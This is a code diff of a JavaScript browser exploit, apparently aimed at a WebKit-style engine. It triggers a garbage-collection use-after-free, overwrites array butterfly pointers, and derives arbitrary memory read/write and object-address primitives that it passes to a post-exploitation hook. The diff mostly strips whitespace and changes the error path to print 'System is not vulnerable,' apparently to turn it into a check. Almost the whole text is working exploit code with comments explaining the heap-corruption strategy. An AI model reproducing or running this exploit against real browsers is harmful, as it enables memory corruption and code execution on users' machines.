@@ -81,7 +81,7 @@ function int64(low,hi) {
         this.low=pck.low;
         return this;
     }
-    
+
     return this;
 }
 
@@ -102,7 +102,7 @@ var peek_val = 0;
 
 function peek_stack() {
     var ret_val = undefined;
-    
+
     var retno = 0xffff;
     arguments.length = { valueOf:
         function() {
@@ -136,7 +136,7 @@ function poke_stack(val) {
 
 function go() {
     try {
-        
+
         for (var i=0; i < 0xffff; i++)
         {
             frame_arr[i] = i;
@@ -150,26 +150,26 @@ function go() {
         // Primitives are peek/poke to stack.
         // Idea is we store a value in a stack frame, then later use uninitialized mem access to retreive it.
         // However, if we trigger a GC run inbetween, it'll detect the object as non-existing, thus allowing UaF.
-        
+
         frame_idx = 0;
         poke_stack(0);
         peek_stack();
         frame_idx = peek_val;
-        
+
         poke_stack(0x4141);
         for (var k=0; k < 8; k++)
             (function(){})();
         peek_stack();
-        
+
         if (peek_val != 0x4141)
         {
             alert('couldnt align to stack');
             return;
         }
-        
-        
+
+
         var uaf_replacement = new Array(0x1000);
-        
+
         for (var i = 0; i < 0x1000; i++)
         {
             uaf_replacement[i] = [];
@@ -178,7 +178,7 @@ function go() {
             }
             uaf_replacement[i].unshift(uaf_replacement[i].shift()); // ensure ArrayStorage
         }
-        
+
         var uaf_hold = new Array(0x100);
         for (var i = 0; i < 0x100; i++)
         {
@@ -201,24 +201,24 @@ function go() {
             }
             uaf_hold1[i].unshift(uaf_hold1[i].shift()); // ensure ArrayStorage
         } // poke holes n shit
-        
-        
+
+
         var uaf_target = []; // no arraystorage
         for (var i = 0; i < 0x80; i++) {
             uaf_target[i] = 0x42420000;
         }
-        
+
         poke_stack(uaf_target); // store uaf_target in stack
         uaf_target = 0; // remove reference
         uaf_hold1 = 0; // remove reference
         uaf_hold = 0;
         for (var k=0; k < 4; k++)
             dgc(); // run GC
-        
+
         peek_stack(); // read stored reference
         uaf_target = peek_val;
         peek_val = 0;
-        
+
         for (var i = 0; i < 0x1000; i++)
         {
             for (var k = 0x0; k < 0x80; k++)
@@ -248,16 +248,16 @@ function go() {
                     {
                         later[i] = new Uint32Array(buf);
                     }
-                    
+
                     var curi = 0x10000;
                     var found = 0;
                     var smashedButterfly = new int64(0,0);
                     var origData = new int64(0, 0);
                     var locateHelper = new int64(0, 0);
-                    
+
                     while (!found) { // Search for an Uint32Array
                         /*
-                         
+
                          Strategy:
                          -> We have heap buffer overflow in butterfly access on uaf_target
                          -> We can try to alter each quadword into 0x1337, check if any Uint32Array changed it's length
@@ -265,7 +265,7 @@ function go() {
                          -> Next up we copy prevView into m_baseAddress
                          -> We now have a master/slave pair of Uint32Arrays.
                          -> We now have the ability to read and write anywhere, plus we hold a pointer to an array's Butterfly, allowing to turn JS objects into pointers and back.
-                         
+
                          */
                         var sv = uaf_target[curi];
                         uaf_target[curi] = 0x1337;
@@ -284,11 +284,11 @@ function go() {
                                 uaf_replacement[yi][k] = 0;
                                 origData.low=smashed[4];
                                 origData.hi=smashed[5];
-                                
+
                                 smashed[4] = smashed[12];
                                 smashed[5] = smashed[13];
                                 smashed[14] = 0x40;
-                                
+
                                 var slave = undefined;
                                 for (var k = 0; k < 0x20000; k++)
                                 {
@@ -298,12 +298,12 @@ function go() {
                                         break;
                                     }
                                 }
-                                
+
                                 if(!slave) throw new Error("couldn't find slave");
-                                
+
                                 smashed[4] = smashedButterfly.low;
                                 smashed[5] = smashedButterfly.hi;
-                                
+
                                 overlap[0] = uaf_target;
                                 var uaf_target_entry = new int64(slave[0], slave[1]);
                                 smashed[4] = uaf_target_entry.low;
@@ -311,14 +311,14 @@ function go() {
                                 slave[2]=0;
                                 slave[3]=0;
                                 uaf_target = 0;
-                                
+
                                 later = null;
-                                
+
                                 smashed[4] = origData.low;
                                 smashed[5] = origData.hi;
-                                
+
                                 // derive primitives
-                                
+
                                 var leakval = function(obj) {
                                     smashed[4] = smashedButterfly.low;
                                     smashed[5] = smashedButterfly.hi;
@@ -330,7 +330,7 @@ function go() {
                                     smashed[5] = origData.hi;
                                     return val;
                                 }
-                                
+
                                 var createval = function(val) {
                                     smashed[4] = smashedButterfly.low;
                                     smashed[5] = smashedButterfly.hi;
@@ -343,7 +343,7 @@ function go() {
                                     smashed[5] = origData.hi;
                                     return val;
                                 }
-                                
+
                                 var read4 = function(addr) {
                                     smashed[4] = addr.low;
                                     smashed[5] = addr.hi;
@@ -352,7 +352,7 @@ function go() {
                                     smashed[5] = origData.hi;
                                     return val;
                                 }
-                                
+
                                 var write4 = function(addr, val) {
                                     smashed[4] = addr.low;
                                     smashed[5] = addr.hi;
@@ -360,7 +360,7 @@ function go() {
                                     smashed[4] = origData.low;
                                     smashed[5] = origData.hi;
                                 }
-                                
+
                                 var read8 = function(addr) {
                                     smashed[4] = addr.low;
                                     smashed[5] = addr.hi;
@@ -369,7 +369,7 @@ function go() {
                                     smashed[5] = origData.hi;
                                     return val;
                                 }
-                                
+
                                 var write8 = function(addr, val) {
                                     smashed[4] = addr.low;
                                     smashed[5] = addr.hi;
@@ -379,28 +379,28 @@ function go() {
                                     if (!(val instanceof int64)) {
                                         val = new int64(val,0);
                                     }
-                                    
+
                                     slave[0] = val.low;
                                     slave[1] = val.hi;
-                                    
+
                                     smashed[4] = origData.low;
                                     smashed[5] = origData.hi;
                                 }
-                                
+
                                 if (createval(leakval(0x1337)) != 0x1337) {
                                     throw new Error("invalid leak/create val behaviour");
                                 }
-                                
+
                                 var test = [1,2,3,4,5,6,7,8];
-                                
+
                                 var test_addr = leakval(test);
-                                
+
                                 var butterfly_addr = read8(test_addr.add32(8));
-                                
+
                                 if ((butterfly_addr.low == 0 && butterfly_addr.hi == 0) || createval(read8(butterfly_addr)) != 1) {
                                     throw new Error("broken read primitive");
                                 }
-                                
+
                                 if (window.postexploit) {
                                     window.postexploit({
                                                        read4: read4,
@@ -411,26 +411,24 @@ function go() {
                                                        createval: createval
                                                        });
                                 }
-                                
+
                                 document.getElementById("clck").innerHTML = 'done';
-                                
+
                                 return 2;
                             }
                         }
-                        
+
                         uaf_target[curi] = sv;
-                        
+
                         curi ++;
                     }
                     alert("done!");
                 }
             }
         }
-        
-        return 1;
-    } catch (e) { alert(e); }
-}
 
-window.onload = function () {
-    document.getElementById("clck").innerHTML = '<a href="javascript:go()">go</a>';
-};
+        return 1;
+    } catch (e) { if(e != null) {
+      print("System is not vulnerable.");
+    } }
+}
